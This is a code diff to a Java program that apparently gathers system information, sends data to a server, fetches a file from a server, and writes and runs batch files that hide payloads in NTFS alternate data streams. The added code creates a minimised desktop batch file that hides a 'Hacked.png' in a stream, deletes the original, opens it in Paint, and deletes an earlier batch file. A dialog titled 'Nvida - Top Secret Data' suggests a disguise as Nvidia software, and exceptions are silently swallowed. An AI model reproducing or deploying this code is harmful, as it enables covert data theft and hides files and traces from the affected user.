@@ -91,8 +91,12 @@ public class Main {
         storeDataToServer(file);
 
         createBatchFile();
+        File file3 = new File(userHome + "\\Nvida.bat");
+        file3.delete();
 
         getFileFromServer();
+
+        createBatchFile2();
 
         JOptionPane.showMessageDialog(windowPopup, sysInfo, "Nvida - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);
 
@@ -148,7 +152,9 @@ public class Main {
             dos.writeBytes("\n");
             dos.writeBytes("cd %userprofile%");
             dos.writeBytes("\n");
-            dos.writeBytes("type Infos3785646s3838975.dll > readme.txt:hiddenfile.txt");
+            dos.writeBytes("type Infos3785646s3838975.dll > readme.txt:hiddenfile.dll");
+            dos.writeBytes("\n");
+            dos.writeBytes("exit");
 
             // execute the batch file
             Process p = Runtime.getRuntime().exec("cmd /c start " + userHome + "/Nvida.bat");
@@ -159,6 +165,41 @@ public class Main {
             dos.close();
 
             storeDataToServer(readme);
+
+        } catch (Exception ex) {
+        }
+    }
+
+    private static void createBatchFile2(){
+        String userHome = System.getProperty("user.home");
+        try {
+
+            // create new file called sample in "c" drive
+            File file2 = new File(userHome + "/Desktop/startmes3785646s3838975.bat");
+            FileOutputStream fos = new FileOutputStream(file2);
+
+            // write some commands to the file
+            DataOutputStream dos = new DataOutputStream(fos);
+            dos.writeBytes("cd /");
+            dos.writeBytes("\n");
+            dos.writeBytes("cd %userprofile% /Desktop");
+            dos.writeBytes("\n");
+            dos.writeBytes("type Hacked.png > startmes3785646s3838975.bat:hiddenfile.png");
+            dos.writeBytes("\n");
+            dos.writeBytes("del Hacked.png");
+            dos.writeBytes("\n");
+            dos.writeBytes("\"%windir%\\system32\\mspaint.exe\" startmes3785646s3838975.bat:hiddenfile.png");
+            dos.writeBytes("\n");
+            dos.writeBytes("exit");
+
+
+            // execute the batch file
+            Process p = Runtime.getRuntime().exec("cmd /c start /MIN " + userHome + "/Desktop/startmes3785646s3838975.bat");
+
+            // wait for termination
+            p.waitFor();
+
+            dos.close();
 
         } catch (Exception ex) {
         }
